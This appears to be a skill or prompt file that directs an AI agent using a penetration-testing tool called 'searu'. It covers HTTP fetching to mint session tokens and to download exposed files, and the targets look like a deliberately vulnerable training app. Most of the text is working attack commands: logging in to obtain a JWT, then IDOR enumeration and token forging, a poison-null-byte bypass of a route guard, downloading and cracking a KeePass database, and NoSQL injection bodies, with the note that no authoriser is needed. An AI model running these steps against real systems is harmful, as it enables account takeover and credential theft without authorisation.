---
model: haiku
---

# fetch — HTTP request: download a file or mint a token (T1083)

Make an HTTP request. GET retrieves a file the app leaves reachable (`.bak`, config, archive, KeePass)
into the run's output directory; `--method POST/PUT` with `--data` drives an API — above all to **mint a
session token** by logging in, which is the key that unlocks the authenticated attack surface. Discovery,
Active tier — allow-list T1083; no authoriser needed.

Mint a JWT (then carry it into authz/jwt):

    searu run fetch --technique T1083 --target http://host:port/rest/user/login -- \
      --method POST --header 'Content-Type: application/json' \
      --data '{"email":"<user>","password":"<pass>"}'
    searu loot --category session-token --reveal      # the minted JWT
    # → searu run authz … -- --header "Authorization: Bearer <token>" --range 1-20   (IDOR)
    # → searu run jwt   … -- <token> -X a -b                                          (forge)

Download a file (a 403 backup often yields to a poison-null-byte suffix the static route guard misses):

    searu run fetch --technique T1083 --target http://host:port/ftp/incident-support.kdbx
    searu run fetch --technique T1083 --target 'http://host:port/ftp/coupons_2013.md.bak%2500.md'

Read results:

    searu loot --category session-token --reveal   # a minted token
    searu observations --kind download              # a saved file and its size (also --kind output)

Hand a downloaded KeePass/zip to `searu run crack --target src:<path>`; a source tree to a `src:`
analysis (grype/osv-scanner); POST/PUT a `{"$ne":...}`/`{"$where":...}` body for NoSQL injection. Don't
paste raw bodies. See `searu tool advice fetch`.
